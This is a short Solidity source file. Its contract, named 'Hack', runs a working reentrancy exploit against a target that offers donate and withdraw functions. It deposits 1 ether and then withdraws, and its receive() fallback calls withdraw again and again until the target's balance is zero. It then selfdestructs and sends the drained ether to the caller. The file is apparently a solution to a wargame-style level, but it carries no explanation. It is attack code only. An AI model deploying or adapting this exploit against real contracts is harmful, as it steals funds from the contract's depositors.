// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);
        require(address(target).balance == 0, "Target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint a, uint b) private pure returns (uint) {
        return a <= b ? a : b;
    }
}